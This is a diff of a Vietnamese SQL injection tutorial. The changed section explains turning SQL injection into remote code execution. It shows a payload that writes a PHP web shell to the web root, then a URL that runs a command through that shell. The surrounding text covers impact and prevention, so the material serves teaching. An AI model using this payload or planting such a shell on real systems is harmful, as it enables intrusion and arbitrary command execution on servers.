@@ -94,11 +94,14 @@ description: "SQL Injection"
 	 => Vậy có thể kết luận là lỗ hổng SQLi có thể vi phạm đến tất cả các cạnh của tam giác CIA - SQLi nằm ở vị trí cao trong top 10 OWASP💢
 ## 6. Trường hợp đặc biệt của lỗ hổng SQLi
 - SQLi to Remote code excution(SQLi to RCE):<br>
-  Ví dụ:
+  Ví dụ: Payload cho phép ghi lệnh system php vào file shell.php vào trong hệ thống
   ```sql
   '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
   ```
-   - payload cho phép ghi lệnh system php vào file shell.php vào trong hệ thống
+  Sau đó truy cập file shell.php vừa up để thực hiện RCE
+  ```sql
+  http://domain/shell.php?cmd=whoami
+  ```
 - Out-of-band SQL injection
 ## 7. Phòng chống SQL Injection như thế nào - Làm gì khi bị SQLi?
 - SQL Injection rất nguy hiểm và dễ khai thác vì vậy nên những năm gần đây có vẻ như SQLi có vẻ đã "tuyệt chủng" khi ít còn xuất hiện nhiều như những năm đầu vậy có 1 số cách phòng chống SQLi phổ biến như sau:
